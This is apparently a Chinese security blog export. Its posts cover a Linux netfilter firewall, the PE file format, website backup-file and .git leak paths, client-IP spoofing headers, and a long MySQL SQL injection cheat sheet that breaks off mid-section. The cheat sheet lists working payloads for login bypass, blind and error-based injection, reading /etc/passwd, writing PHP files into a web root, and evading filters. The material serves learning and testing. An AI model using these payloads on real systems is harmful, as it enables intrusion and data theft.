{"pages":[],"posts":[{"title":"A Simple Packet Filtering Firewall in Linux(Linux下的包过滤防火墙)","text":"基本信息该防火墙通过 Linux内核模块LKM的C语言来编写的防火墙 使用 Python写用户态下的界面 Python与C结合来实现对防火墙进行配置 源码地址: https://github.com/CSHF-yhhhh/A-Simple-Packet-Filtering-Firewall-in-Linux 准备工作 查看是否安装 linux-headers1ls -l /usr/src/linux-headers-$(uname -r) 如果不存在该目录,则安装:123sudo apt updateapt search linux-headers-$(uname -r)sudo apt install linux-headers-$(uname -r) 了解内核模块https://en.wikipedia.org/wiki/Loadable_kernel_module 了解 Netfilterhttps://en.wikipedia.org/wiki/Netfilter 接下来讲的是部分实现防火墙的原理,如果对原理不感兴趣只想直接运行的话, 点这里跳到代码运行介绍 编写一个简单的防火墙防火墙拦截数据包在包过滤防火墙中,最重要的就是把数据包拦截下来,钩子函数就是完成这一功能的函数,接下来介绍一下钩子函数 钩子函数的介绍钩子函数需要我们自己编写, 拦截到数据包后, 在函数中进行处理, 并处理数据包(通过返回值) 钩子函数的参数介绍123456789101112typedef unsigned int nf_hookfn(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *));/*hooknum:钩子被记录的点skb:指向包含数据包信息的结构体的指针in:输入网络接口out:输出网口最后一个形参:指向一个由netfilter本身调用的函数的指针，在所有钩子完成之后，钩子函数通常不会调用它，因为这会导致其他钩子不能完成它们的工作。*/ 数据包的接收点(拦截点) 接收点 描述 NF_IP_PRE_ROUTING 收到数据包后 NF_IP_LOCAL_IN 发送到网络栈的数据包 NF_IP_FORWARD 要被转发的数据包 NF_IP_POST_ROUTING 已经经过路由准备发送的包 NF_IP_LOCAL_OUT 来自本机网络栈的数据包 钩子函数处理包的方法钩子函数通过 return 以下值中的一个来处理包 值 描述 NF_DROP 丢弃数据包 NF_ACCEPT 接受数据包 NF_STOLEN 钩子窃取数据包 NF_QUEUE 将数据包排队到用户空间 NF_REPEAT 重复钩子函数 注册钩子函数12345678910111213141516171819202122232425262728293031323334//nf_hook_ops结构体struct nf_hook_ops { struct list_head list; /* User fills in from here down. */ nf_hookfn *hook; struct module *owner; u_int8_t pf; unsigned int hooknum; /* Hooks are ordered in ascending priority. */ int priority;};/*hook: 处理包的钩子函数owner: 表示该函数在其中定义和注册的模块。pf: 指定想要接收声明类型的数据包hooknum: 钩子被记录的点priority: 优先级 priority 可选字段 NF_IP_PRI_FIRST = INT_MIN NF_IP_PRI_CONNTRACK_DEFRAG = -400 NF_IP_PRI_RAW = -300 NF_IP_PRI_SELINUX_FIRST = -225 NF_IP_PRI_CONNTRACK = -200 NF_IP_PRI_MANGLE = -150 NF_IP_PRI_NAT_DST = -100 NF_IP_PRI_FILTER = 0 NF_IP_PRI_SECURITY = 50 NF_IP_PRI_NAT_SRC = 100 NF_IP_PRI_SELINUX_LAST = 225 NF_IP_PRI_CONNTRACK_CONFIRM = INT_MAX NF_IP_PRI_LAST = INT_MAX*/ 注册完钩子函数后, 即可使用, 更多细节可以阅读 firewall.c 中源码的注释 部署防火墙以下提到的命令都最好都在代码所在目录用root下执行 测试时所用的环境Ubuntu 18.04 gcc version 7.5.0 python 3.6.9 测试防火墙切换到代码所在目录下 防火墙的启动1. 生成内核模块1make make 可能会有一些warning,这些没太大问题,如果有强迫症的话可以自己去改一下 2. 加载内核模块1insmod firewall.ko 执行这条命令后, 如果没有任何提示,则防火墙可能加载成功 3. 信息查看查看所有已加载的模块,如果能找到firewall及表示加载成功 1lsmod 查看防火墙模块信息 1modinfo firewall.ko 持续监听内核日志, 该命令使用 Ctrl + C 结束 1journalctl -f 防火墙的操作 PS: 其实在make之后, 就可以通过该界面来配置防火墙,包括防火墙的启动与停止,前提是要以root的身份来执行所以使用该模块的前提就是make成功 启动防火墙的配置界面1python3 page.py 启动后界面如下:通过界面操作, 即可配置防火墙的过滤规则 怎么使用就自己取摸索吧, 如果有Bug可以给我留言,有空我就会取修改 (¬‿¬)","link":"/2021/05/27/A-Simple-Packet-Filtering-Firewall-in-Linux/"},{"title":"HTTP更改客户端IP的方式","text":"HTTP头 描述 对应PHP字段 X-Forwarded-For 用户是在哪个IP使用的代理（有可能存在，也可以伪造） $_SERVER[‘HTTP_X_FORWARDED_FOR’] X-Remote-Addr 访问端（有可能是用户，有可能是代理的）IP $_SERVER[‘REMOTE_ADDR’] X-Client-IP 用户是在哪个IP使用的代理（有可能存在，也可以伪造） $_SERVER[‘HTTP_CLIENT_IP’]","link":"/2021/02/03/ChangeHttpClientIP/"},{"title":"基于 Kivy&#x2F;Kivymd 开发的成语学习APP","text":"本项目已成功打包,使用的打包环境请参考nkiiiid的文章buildozer.spec文件请参考/MainApp/buildozer.spec项目和成功成功打包的APK已上传至github ,可自行下载 环境说明 Kivy==1.11.1kivy-deps.glew==0.3.0kivy-deps.gstreamer==0.3.1kivy-deps.sdl2==0.3.1Kivy-Garden==0.1.4kivymd==0.104.1Django==3.1openpyxl==3.0.6 本地运行 server服务端 服务端使用Diango框架,通过json来传输数据 12#如果需要部署在服务器上记得在服务器中开放使用的端口python ./server/manage.py runserver ip:port #eg: python manage.py 0.0.0.0:12345 MainApp/client/client.py 在这个文件夹中设置服务器的地址和端口 启动app 在MainApp下,通过以下命令运行 1python main.py","link":"/2021/04/23/Kivy-Kivymd-Learn-APP/"},{"title":"网站信息泄露","text":"常见的网站源码泄露 备份常见备份文件名 1234567webwebsitebackupbackwwwwwwroottemp 备份文件的后缀 1234tartar.gzziprar 使用文件名与后缀的组合来测试是否有备份文件 版本控制访问 12/.git/.svn VIM当我们在使用vim编辑的时候，vim会在被编辑文件同一目录下，创建一个名为filename.swp的文件，记录我们的动作，比如在编辑index.php的时候会存在一个index.php.swp的文件,可以访问改文件来查看源码有时也可能不需要加. 123.index.php.swp #第一次产生的交换文件.index.php.swo #第二次产生的交换文件.index.php.swn #第三次产生的交换文件 其他12/editor/tz.php","link":"/2021/02/03/WebsiteInformationLeakage/"},{"title":"PE文件","text":"前言PE 的全称是 Portable Executable，意为可移植的可执行的文件，常见的 EXE、DLL、OCX、SYS、COM 都是 PE 文件，PE 文件是微软 Windows 操作系统上的程序文件（可能是间接被执行，如 DLL）。PE 是一种数据结构，其中封装了 Windows OS 加载程序管理包装的可执行代码所需的信息。 RVA(relative virtual address)相对虚拟内存地址（Reverse Virtual Address , RVA）是相对于基地址的偏移，即 RVA 是虚拟内存中用来定位某个特定位置的地址，该地址的值是这个特定位置距离某个模块基地址的偏移量，所以说 RVA 是针对某个模块而存在的。 PE 文件的基本结构 这些部分是 PE 文件中真正用于 Win32 的部分，为了与 DOS 系统的文件格式兼容，在这部分的前面又加上了一个标准的 DOS MZ 格式的可执行部分，所有这些部分合起来组成了现在使用的 PE 文件。 1. DOS 文件头和 DOS 块（图中的 ①） PE 文件中包括一个标准的 DOS 可执行文件部分，该部分是用来向下兼容，如果在 DOS 下执行一个 PE 文件，系统可以将文件解释为 DOS 下的.exe 可执行格式，并执行 DOS 部分的代码。 PE 文件中的 DOS 部分由 MZ 格式的文件头和可执行代码部分组成，可执行代码被称为“DOS 块”（DOS stub）。 如果 e_magic 字段为 5A4DH 表示 DOS MZ header 有效。且 e_lfarlc 字段表示的是PE header的地址。 2. PE 文件头（也称 NT 文件头）（图中的 ②） PE 文件头是由 IMAGE_NT_HEADERS 结构定义的 如图 PE 文件头的第一个双字 Signature 是一个标志，它被定义为00004550h，也就是字符“P”，“E”加上两个 0。这也是“PE”这个称呼的由来，大部分的文件属性由标志后面的IMAGE_FILE_HEADER和IMAGE_OPTIONAL_HEADER32结构来定义。虽然这两个 PE 文件表头结构是可选的，但实际上这个名称是名不符实的，因为它总是存在于每个 PE 文件中。 IMAGE_FILE_HEADER 结构 标准IMAGE_FILE_HEADER紧跟在PE头标识后，即位于IMAGE_DOS_HEADER的e_lfanew值+4 的位置。由此位置开始的20个字节为数据结构标准 PE 头IMAGE_FILE_HEADER的内容。 Machine字段：来指定文件的运行平台 [点此查看预定义值] NumberOfSections字段：指出文件中存在的节的数量 TimeDateStamp字段：编译器创建此文件的时间，它的数值是从 1969 年 12 月 31 日下午 4：00 开始到创建时间为止的总秒数。 PointerToSymbolTable和NumberOfSymbols字段：这两个字段并不重要，它们与调试用的符号表有关。 SizeOfOptionalHeader字段：紧接在当前结构下面的IMAGE_OPTIONAL_HEADER32结构的长度，这个值等于00e0h。 Characteristics字段：属性标志字段，它的不同数据位定义了不同的文件属性 [点此查看预定义值] IMAGE_OPTIONAL_HEADER32 结构 AddressOfEntryPoit 字段指出文件被执行时的入口地址（这是一个 RVA 地址）。如果在一个可执行文件上附加了一段代码并想让这段代码首先被执行，那么只需要将这个入口地址指向附加的代码就可以了。 ImageBase 字段指出文件的优先装入地址。也就是说当文件被执行时，如果可能的话，Windows 优先将文件装入到由ImageBase字段指定的地址中，只有指定的地址已经被其他模块使用时，文件才被装入到其他地址中。 SectionAlignment 字段和 FileAlignment 字段SectionAlignment字段指定了节被装入内存后的对齐单位。也就是说，每个节被装入的地址必定是本字段指定数值的整数倍。而 FileAlignment 字段指定了节存储在磁盘文件中时的对齐单位。 Subsystem 字段指定使用界面的子系统。这个字段决定了系统如何为程序建立初始的界面。 DataDirectory 字段这个字段可以说是最重要的字段之一，它由 16 个相同的IMAGE_DATA_DIRECTORY结构组成，虽然 PE 文件中的数据是按照装入内存后的页属性归类而被放在不同的节中的，但是这些处于各个节中的数据按照用途可以被分为导出表、导入表、资源、重定位表等数据块，这 16 个IMAGE_DATA_DIRECTORY结构就是用来定义多种不同用途的数据块的。 如果将这 16 个 IMAGE_DATA_DIRECTORY 结构按照排列顺序编号为索引号 0 到 15，那么其用途和索引号是一一对应的，其对应关系如下表 索引 索引值在 Windows.inc 中的预定义值 对应的数据块 0 IMAGE_DIRECTORY_ENTRY_EXPORT 导出表地址和大小 1 IMAGE_DIRECTORY_ENTRY_IMPORT 导入表地址和大小 2 IMAGE_DIRECTORY_ENTRY_RESOURCE 资源表地址和大小 3 IMAGE_DIRECTORY_ENTRY_EXCEPTION 异常表地址和大小 4 IMAGE_DIRECTORY_ENTRY_SECURITY 属性证书数据地址和大小 5 IMAGE_DIRECTORY_ENTRY_BASERELOC 基地址重定位表地址和大小 6 IMAGE_DIRECTORY_ENTRY_DEBUG 调试信息地址和大小 7 IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 版权信息 8 IMAGE_DIRECTORY_ENTRY_GLOBALPTR 指向全局指针寄存器的值 9 IMAGE_DIRECTORY_ENTRY_TLS 线程局部存储地址和大小 10 IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 加载配置表地址和大小 11 IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 绑定导入表地址和大小 12 IMAGE_DIRECTORY_ENTRY_IAT 导入函数地址表 13 IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 延迟导入表地址和大小 14 IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR CLR 运行时头部数据地址和大小 15 未使用 例: 在 PE 文件中寻找特定的数据时就是从这些 IMAGE_DATA_DIRECTORY 结构开始的，比如要存取资源，那么必须从第 3 个 IMAGE_DATA_DIRECTORY 结构（索引为 2）中得到资源数据块的大小和位置；同理，如果要查看 PE 文件导入了哪些 DLL 文件的哪些 API 函数，那就必须首先从第 2 个 IMAGE_DATA_DIRECTORY 结构得到导入表的位置和大小。 3. 节表 节表头紧跟在IMAGE_NT_HEADERS后面 PE 文件中所有节的属性都被定义在节表中，节表由一系列的IMAGE_SECTION_HEADER结构排列而成，每个结构用来描述一个节，结构的排列顺序和它们描述的节在文件中的排列顺序是一致的。 节表被存放在紧接在 PE 文件头的地方，也就是从 PE 文件头 （注意：不是文件本身的头部） 开始的偏移为00f8h的地方。 PE 文件中的数据按照装入内存后的页面属性被划分成多个节，并由节表中的数据来描述这些节。一个节中的数据仅仅是属性相同而已，并不一定就是同一种用途的，比如导入表、导出表等就有可能和只读常量一起被放在同一个节中，因为它们的属性同是可读不可写的。其次，由于不同用途的数据可能被放在同一个节中，仅仅依靠节表是无法确定它们的存放位置的，PE 文件中依靠文件头中IMAGE_OPTIONAL_HEADER32结构内的数据目录表来指出它们的位置，可以由数据目录表来定位的数据包括导入表、导出表、资源、重定位表和 TLS 等 15 种数据。 节表中IMAGE_SECTION_HEADER结构的总数由 PE 文件头IMAGE_NT_HEADERS结构中的FileHeader.NumberOfSections字段指定。 IMAGE_SECTION_HEADER 结构的定义如下： 结构中的有些字段是供 COFF 格式的 obj 文件使用的，对可执行文件来说不代表任何意义，在分析的时候可以不予理会，真正有用的几个字段说明如下。 字段名 作用 备注 Name1 表示节的名称 每个节的名称是唯一的，不能有同名的两个节(，在 MASM32 产生的可执行文件中，代码节被命名为“.text”；可读写的数据节被命名为“.data”；包含只读数据、导入表以及导出表的节被命名为“.rdata”；而资源节被命名为“.rsrc”等。但是在其他一些编译器中，导入表被单独放在“.idata”中；而代码节可能被命名为“.code”。) VirtualSize 代表节的大小 这是节的数据在没有进行对齐处理前的实际大小 PointerToRawData 指出节在磁盘文件中的所处的位置 这个数值是从文件头开始算起的偏移量 SizeOfRawData 指出节在磁盘文件中所占的空间大小 ，这个数值等于 VirtualSize 字段的值按照 FileAlignment 的值对齐以后的大小 Characteristics 这是节的属性标志字段，其中的不同数据位代表了不同的属性 通过 Name1 、VirtualSize、PointerToRawData、SizeOfRawData ，装载器就可以从 PE 文件中找出某个节（从 PointerToRawData 偏移开始的 SizeOfRawData 字节）的数据，并将它映射到内存中去（映射到从模块基地址开始偏移 VirtualAddress 的地方，并占用以 VirtualSize 的值按照页的尺寸对齐后的空间大小）。 导入表 定义在 Win32 编程中常常用到“导入函数”（Import functions），导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个 DLL 中，在调用者程序中只保留一些函数信息，包括函数名及其驻留的 DLL 名等，导入表中保存的正是函数名和其驻留的 DLL 名等动态链接所必需的信息。 导入表的位置导入表的位置和大小可以从 PE 文件头中IMAGE_OPTIONAL_HEADER32结构的数据目录字段中获取，对应的项目是 DataDirectory 字段的第 2 个IMAGE_DATA_DIRECTORY结构(也就是IMAGE_DIRECTORY_ENTRY_IMPORT) 导入表的结构 结构中的Name1字段指向此结构所对应的 DLL 文件 的名称，这个文件名是一个以NULL结尾的字符串。 OriginalFirstThunk字段和FirstThunk字段都指向一个包含一系列IMAGE_THUNK_DATA结构的数组，数组中的每个IMAGE_THUNK_DATA结构定义了一个导入函数的信息，数组的最后以一个内容为 0 的IMAGE_THUNK_DATA结构作为结束。 IMAGE_THUNK_DATA结构如下一个IMAGE_THUNK_DATA结构实际上就是一个双字，之所以把它定义成结构，是因为它在不同的时刻有不同的含义 最高位为 1 时，表示函数是以序号的方式导入的，这时双字的低位就是函数的序号。 当双字的最高位为 0 时，表示函数以字符串类型的函数名方式导入(这时双字的值是一个 RVA，指向一个用来定义导入函数名称的IMAGE_IMPORT_BY_NAME结构) OriginalFirstThunk指向的IMAGE_THUNK_DATA数组包含导入信息，在这个数组中只有Ordinal和AddressOfData是有用的，因此可以通过OriginalFirstThunk查找到函数的地址。 FirstThunk则略有不同，在 PE 文件加载以前或者说在导入表未处理以前，他所指向的数组与OriginalFirstThunk中的数组虽不是同一个，但是内容却是相同的，都包含了导入信息，而在加载之后，FirstThunk中的Function开始生效，他指向实际的函数地址，因为FirstThunk实际上指向IAT中的一个位置，IAT就充当了IMAGE_THUNK_DATA数组，加载完成后，这些 IAT 项就变成了实际的函数地址，即 Function 的意义。看图可能更方便与理解 导入地址表 IAT IMAGE_IMPORT_DESCRIPTOR结构中FirstThunk字段指向的数组最后会被替换成导入函数的真正入口地址，暂且把这个数组称为导入地址数组。在 PE 文件中，所有 DLL 对应的导入地址数组在位置上是被排列在一起的，全部这些数组的组合也被称为导入地址表（Import Address Table，或者简称为 IAT），导入表中第一个IMAGE_IMPORT_DESCRIPTOR结构的FirstThunk字段指向的就是 IAT 的起始地址。 还有一个方法可以更方便地找到 IAT 的地址，那就是通过数据目录表。数据目录表中的第 13 项（索引值为 12/IMAGE_DIRECTORY_ENTRY_IAT）直接用来定义 IAT 数据块的位置和大小。 扩展知识 装载 PE 文件的主要步骤 当 PE 文件被执行，PE 装载器检查 DOS MZ Header 里的 PE Header 偏移量，如果找到就跳转到 PE Heardr。 PE 装载器检查 PE Header 的有效性，如果有效就跳转到 PE Header 的尾部 下面紧跟 PE Heardr 的是节表。PE 装载器读取其中的节信息，并采用文件映射方法将这些节映射到内存，同时附上节表里指定的节属性。 PE 文件映射入内存后，PE 装载器将处理 PE 文件中类似 Import Tabel(引入表)逻辑部分。 检验 PE 文件的有效性 首先检验文件头部第一个字e_magic的值是否等于 5A4DH , 如果是，则检查第二项。 一旦证明文件的 DOS header 有效后，就用e_lfanew来定位 PE header 。比较 PE header 的 Signature 是否为 00004550h；是则可以认为该文件是一个有效的 PE 文件。 例: 查看 PE 文件 本次使用的是Detect it Easy，该软件为开源软件，有兴趣的可以去阅读源代码。 软件界面如下 选中程序后,点击 PE 按钮即可查看完整 PE 信息, 如图: 查看 PE 文件的导入表上面在IMAGE_OPTIONAL_HEADER32)中说过, IMAGE_OPTIONAL_HEADER32 中的 DataDirectory 里面的第二个 IMAGE_DATA_DIRECTORY 即为导入表。如图：在这里可以看到导入表的 16 进制信息,当然,这个软件将导入表的信息处理好放在 Import 下,让我们更好查看:在这个模块中,也将导入函数的相关信息等,还是比较方便的。 参考 《Windows 环境下 32 位汇编语言程序设计(典藏版)》 罗云彬[著] 《Windows PE 权威指南》戚利[著] 微软官方文档 PE 文件查看器Detect it Easy(点击转到下载地址)","link":"/2021/05/04/PE_FILE/"},{"title":"SQL注入总结(MySQL)","text":"常用信息 数据库信息的获取 注入方法 常见绕过 附录 常用信息 测试 payload(万能密码) 注释符号 常用运算符 常用函数和语句 字符串拼接 测试 payload(万能密码)其中单引号都可用换成双引号 123456789admin' --admin' #admin'\\/*1' or 1=1#1' or 1=1--1' or 1=1/*') or '1'='1') or ('1'='1'1 or '1 注释符号12345-- x#注意--后有一个空格, x为任意字符#/**/ # 多行注释,可以用来绕过空格过滤/*! */ # MYSQL特有;%00 常用运算符 运算符 说明 || 或,同or &amp;&amp; 与,同and ! 非,同not ^ 异或,同xor &amp; 按位与 | 按位或 &lt;&lt; 按位左移 &gt;&gt; 按位右移 ~ 按位取反 + 加, 可代替空格 - 减 * 乘 / 除 % 取余,同MOD = 等于 &lt;&gt; != 不等于 &lt; 小于 &gt; 大于 &lt;= 小于等于 &gt;= 大于等于 BETWEEN 在两值之间 NOT BETWEEN 不在两值之间 IN 在集合中 NOT IN 不在集合中 &lt;=&gt; 两个操作码均为 NULL 时, 其所得值为 1；而当一个操作码为 NULL 时, 其所得值为 0 LIKE 模糊匹配 REGEXP RLIKE 正则式匹配 IS NULL 为空 IS NOT NULL 不为空 常用函数和语句 函数 作用 user() 当前用户名 database() 当前数据库名 current_user() 当前用户,可用来查看权限 version() 数据库版本 @@datadir 数据库的路径 load_file() 读文件操作 into outfile()/into dumpfile 写文件操作 LENGTH(str) 返回字符串的长度. PI() 返回 π 的具体数值. REGEXP “statement” 正则匹配数据, 返回值为布尔值. LIKE “statement” 匹配数据, %代表任意内容. 返回值为布尔值. RLIKE “statement” 与 regexp 相同. LOCATE(substr,str,[pos]) 返回子字符串第一次出现的位置. POSITION(substr IN str) 等同于 LOCATE(). LOWER(str) 将字符串的大写字母全部转成小写. 同：LCASE(str). UPPER(str) 将字符串的小写字母全部转成大写. 同：UCASE(str). ELT(N,str1,str2,str3,…) 与 MAKE_SET(bit,str1,str2…)类似, 根据 N 返回参数值. NULLIF(expr1,expr2) 若 expr1 与 expr2 相同, 则返回 expr1, 否则返回 NULL. CHARSET(str) 返回字符串使用的字符集. DECODE(crypt_str,pass_str) 使用 pass_str 作为密码, 解密加密字符串 crypt_str. 加密函数：ENCODE(str,pass_str). 字符串拼接 函数 作用 SUBSTR(str,N_start,N_length) 对指定字符串进行截取，为 SUBSTRING 的简单版。 SUBSTRING() 多种格式 SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)。 RIGHT(str,len) 对指定字符串从最右边截取指定长度。 LEFT(str,len) 对指定字符串从最左边截取指定长度。 RPAD(str,len,padstr) 在 str 右方补齐 len 位的字符串 padstr，返回新字符串。如果 str 长度大于 len，则返回值的长度将缩减到 len 所指定的长度。 LPAD(str,len,padstr) 与 RPAD 相似，在 str 左边补齐。 MID(str,pos,len) 同于 SUBSTRING(str,pos,len)。 INSERT(str,pos,len,newstr) 在原始字符串 str 中，将自左数第 pos 位开始，长度为 len 个字符的字符串替换为新字符串 newstr，然后返回经过替换后的字符串。INSERT(str,len,1,0x0)可当做截取函数。 CONCAT(str1,str2…) 函数用于将多个字符串合并为一个字符串 GROUP_CONCAT(…) 返回一个字符串结果，该结果由分组中的值连接组合而成。 MAKE_SET(bits,str1,str2,…) 根据参数 1，返回所输入其他的参数值。可用作布尔盲注，如：EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,’1’,’710’))。 数据库信息的获取 数据库名 表名 列名 表中的数据 查询连接过数据库的所有 IP 和其连接过的总次数 注入方法 数据库名1234567891011#查看当前数据库SELECT database();#查看所有数据库show databases;SELECT schema_name FROM information_schema.schemata;SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;#通过不存在的函数名.可能可以得到数据库名SELECT a(); 表名1234567#查看指定数据库的表名SELECT grouop_concat(table_name) FROM information_schema.tables WHERE table_schema=database() SELECT GROUP_concat(table_name) FROM mysql.innodb_table_stats WHERE database_name=database() # 查询被访问过的表SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='mspwd' GROUP BY table_name; SELECT table_name FROM sys.x$schema_flattened_keys WHERE table_schema='mspwd' GROUP BY table_name; 列名12345678910111213141516171819#通过预定义的分析诊断工具, 在执行完语句后加上即可procedure analyse() #如:SELECT * FROM `users` procedure analyse()# 查询指定表的列名SELECT GROUP_concat(column_name) FROM information_schema.columns WHERE table_name = 表名;# 通过比较数据大小,获得表中的数据SELECT ((SELECT 1,'Dumb',&quot;Dum&quot;)&gt;(SELECT * FROM users LIMIT 1))#通过join后出现相同列名,报错查看其他列名SELECT * FROM `users` union SELECT * FROM (SELECT * FROM users as a join users b)c /*注: 执行完上面语句后,会提示 Duplicate column name 'id' 这就是第一列的列名 得到第一列列名后,通过 using 声明内连接来避免报错, 执行下面语句后,得出第二列列名,以此类推 SELECT * FROM `users` union SELECT * FROM (SELECT * FROM users as a join users b using(id))c */#猜列名and 列名 is not nulland substr(列名,1,1)='a 表中的数据12#查询表中的指定列数据(其中的`1`即为第几列)SELECT GROUP_concat(`1`) FROM (SELECT 1,2,3 union SELECT * FROM users)x; 查询连接过数据库的所有 IP 和其连接过的总次数1SELECT host,total_connections FROM sys.host_summary; 查看 SQL 语句执行的记录1SELECT * FROM sys.x$statement_analysis; 注入方法 union 联合注入 堆叠注入 盲注 布尔盲注 时间盲注 报错注入 二次注入 limit 注入 update 注入 insert 注入 ORDER BY 注入 GROUP BY 注入 读写文件 无列名盲注 union 联合注入基本步骤:[1]猜语句结构并闭合--&gt;[2]猜查询字段数--&gt;[3]拼接查询语句 猜查询字段数方法 123456789#若实际查询列数大于, 则页面错误/无内容, 若小于或等于, 则页面正常GROUP BY 第几列ORDER BY 第几列#使用union, union SELECT几列成功,就有几列数据union SELECT 1,2,3,4,x...#使用limit 获得查询列数,有几列就几个@, 如果不一致则报错SELECT * FROM users ORDER BY id desc limit 0,1 into @,@,@ 堆叠注入可以用 ; 来结束语句,并执行其他语句 1234567891011#查看数据库相关信息;show databases;;show tables;;show columns FROM 表名;#更新数据;update users set password=&quot;123456&quot; WHERE 1;#预处理语句;PREPARE hack FROM &quot;要执行的sql语句的字符串(可以为16进制、char组成的字符串等)&quot;;EXECUTE hack;#;SET @hacksql = &quot;要执行的sql语句的字符串(可以为16进制、char组成的字符串等)&quot;;PREPARE hack FROM @hacksql;EXECUTE hack;# 盲注 布尔盲注对真或假条件返回的内容容易区分时使用 常用 payload 12345#让前面的语句为假,判断后面的语句SELECT * FROM users WHERE username = '1' and if(ascii(substr(database(),1,1))&lt;128,1,0);#SELECT * FROM users WHERE username = '1' and ascii(substr(database(),1,1))&lt;128; ## 如果注释符被过滤, 可以类似与这样改SELECT * FROM users WHERE username = '1' and ascii(substr(database(),1,1))&lt;128 and '1'='1 时间盲注对真或假条件返回的内容难区分时使用 常用 payload(可以发现只是在 bool 盲注的基础上,使语句成功时等待一段时间) 12345#让前面的语句为假,判断后面的语句SELECT * FROM users WHERE username = '1' and if(ascii(substr(database(),1,1))&lt;128,sleep(3),0);#SELECT * FROM users WHERE username = '1' and ascii(substr(database(),1,1))&lt;128 and sleep(3) ## 如果注释符被过滤, 可以类似与这样改SELECT * FROM users WHERE username = '1' and ascii(substr(database(),1,1))&lt;128 and sleep(3)and '1'='1 报错注入在执行错误语句时,会输出报错信息 exp 报错exp 参数很大时,会产生报错信息1exp(~(SELECT * FROM(SELECT user())a)); pow 报错原理同 exp1pow(~(SELECT * FROM(SELECT user())a),9999); updatexml 报错updatexml 是由于参数的格式不正确而产生的错误12SELECT name FROM user WHERE id=1 and updatexml(1,concat('~',(要查询的内容),'~'),3);#SELECT name FROM user WHERE id=1 and updatexml(1,concat(0x7e,(要查询的内容),0x7e),3);# extractvalue 报错原理同 updatexml1SELECT username FROM user WHERE id=1 and extractvalue(1,concat(0x7e,(要查询的内容),0x7e))# rand()+GROUP()+count()原理: 由于由于WHERE条件每执行一次, rand函数就会执行一次, 在统计数据时判断依据不能动态改变, 所以ORDER/GROUP BY后不能接rand()floor(rand(0)*2)是为了随机获得 0 和 112(SELECT count(*) FROM information_schema.tables GROUP BY concat((SELECT user()),0x7e,floor(rand(0)*2)));union SELECT count(*),concat((SELECT GROUP_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),'~',floor(rand(0)*2))as a FROM information_schema.tables GROUP BY a # 二次注入将恶意数据存储到数据库后, 被读到 SQL 语句中导致的注入,如:将username = 'admin' #'存储到数据库中, 由于 php 中使用 addslashes 会给单引号转义成为 admin\\' #, 但是存入数据库时, 数据库会把 \\' 看成转义字符 变成'来存储,所以最终存入数据库的值为 admin' #, 执行时就变成了 1SELECT * FROM users WHERE username = 'adimn' #' limit 注入使用 procedure analyse 注入,analyse 可以有两个参数: max_elements:指定每列非重复值的最大值, 当超过这个值的时候, MySQL 不会推荐 enum 类型. （默认值 256） max_memory （默认值 8192）analyse()为每列找出所有非重复值所采用的最大内存大小. 12345678#得到列的相关信息SELECT * FROM users ORDER BY id desc limit 0,1 procedure analyse(1,1)#与报错注入结合,得到其他信息SELECT id FROM users limit 2 procedure analyse(extractvalue(1,concat(0x3a,version())),1);#写文件SELECT * FROM users ORDER BY id desc limit 0,1 into outfile &quot;/var/www/html/1.php&quot; LINES TERMINATED BY 0x16进制字符串#获得查询列数,有几列就几个@, 如果不一致则报错SELECT * FROM users ORDER BY id desc limit 0,1 into @,@,@ update 注入update 注入一般使用盲注 1234#其中条件可以是任意表达式,如果条件为真,则会等待5秒, 但是修改后的字段值还是 123update users set password='123'|if(条件,sellp(5), 1) WHERE id = 14;#如果表达式为真则会将字段名修改为 1update users set password = '0' | (substr(database(),1,1) = 's') WHERE id=14; insert 注入原理同 update 注入 1234#其中条件可以是任意表达式,如果条件为真,则会等待5秒, 但是修改后的字段值还是 123insert users value (14, &quot;CSHF&quot;, &quot;0&quot;|if(条件,sellp(5), 1));#如果表达式为真则会将字段名修改为 1insert users value (14, &quot;CSHF&quot;, &quot;0&quot;|(substr(database(),1,1) = 's'); ORDER BY 注入使用报错注入 1SELECT * FROM users ORDER BY updatexml(1,concat('~',(要查询的内容),'~'),3);# GROUP BY 注入也相当于是 bool 盲注 1SELECT * FROM users GROUP BY 1 having substr((SELECT database()),1,1)&lt;'z' 读写文件 读文件 1234SELECT LOAD_FILE('/etc/passwd')SELECT LOAD_FILE(0x2f6574632f706173737764)load data infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY '\\n'; #读取服务端文件load data local infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY '\\n'; #读取客户端文件 写文件 123SELECT '&lt;?php phpinfo();?&gt;' into outfile '/var/www/html/1.php'SELECT version() into outfile &quot;/var/www/html/test.php&quot; LINES TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e # 这里写16进制的字符串 无列名盲注子查询可以使用 &gt;, =, &lt; 来进行比较一般结合bool盲注使用, 注: 对字母的大小写不敏感, 也就是说 'a' = 'A' 1(select 'admin','admin')&gt;(select * from users limit 1) 常见绕过 and 或 or 被过滤/拦截 结果中的关键字被过滤 空格被过滤/拦截 单双引号 逗号被过滤 等号或 like 被过滤 if 被过滤 union被过滤 数字被过滤 HANDLER 语句代替SELECT查询 and 或 or 被过滤/拦截 双写 aandnd、oorr &amp;&amp; 等于 and, || 等于 or 拼接等号=, 如: id=1=(表达式) 使用异或号 xor,^, 如 id=1^(表达式), id=(1)xor(表达式) 结果中的关键字被过滤 使用 replace(group_concat(username),'flag','galf') 空格被过滤/拦截 使用括号嵌套 用注释/**/, /*! */代替空格 使用 + 代替空格 使用不可见字符代替空格, 如 %09 %0a %0b %0c %0d %a0 等 and/or前的空格可省略, and/or后面可用跟上偶数个! 或~来代替空格 例: SELECT/**/*/*!*/FROM/**/users/**/WHERE+id =1/**/or!!~~1 单双引号 如果需要闭合单双引号, 尝试是否存在编码问题,通过编码来闭合 或者是否存在二次注入来闭合引号 如果不需要闭合引号, 可以使用字符串的 16 进制表示一个字符串, 